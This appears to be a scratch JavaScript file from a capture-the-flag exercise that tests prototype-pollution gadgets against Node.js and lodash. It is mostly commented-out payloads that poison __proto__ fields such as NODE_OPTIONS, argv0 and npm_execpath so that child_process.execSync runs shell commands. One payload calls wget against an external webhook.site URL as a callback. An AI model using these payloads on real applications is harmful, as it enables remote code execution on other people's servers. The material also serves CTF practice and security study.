

// const { application } = require('express');
// b = {}
// b.__proto__.main = "/home/xon1l/Desktop/ISIDTU/socialsocial/public/exploit.js"
// b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
// b.__proto__.argv0 = "console.log(require(\"child_process\").execSync(\"touch /tmp/xon1l\").toString())//"
// console.log({}.argv0)

// Trigger gadget
// var proc = require('bytes');
// console.log(proc);
express = require('express');
var _= require('lodash');

// A = {
//   "__proto__": {
//       "data": {
//           "name": "./flag.js",
//           "exports": {
//               ".": "./exploit.js"
//           }
//       },
//       "path": "./",
//       "npm_config_global": 1,
//       "npm_execpath": "--eval=require('child_process').execSync('wget${IFS}https://webhook.site/1a750059-e488-443d-8389-f439f5fc95a5')"
//   },
//   "x": null
// }

// USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./exploit.js"}, "1": "/tmp", "NODE_OPTIONS": "--require ./exploit.js", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch ./yeuluon\\\").toString())//"}}')
// _.merge({}, A);
require('./flag.js');
// // console.log("After : " + a.oops);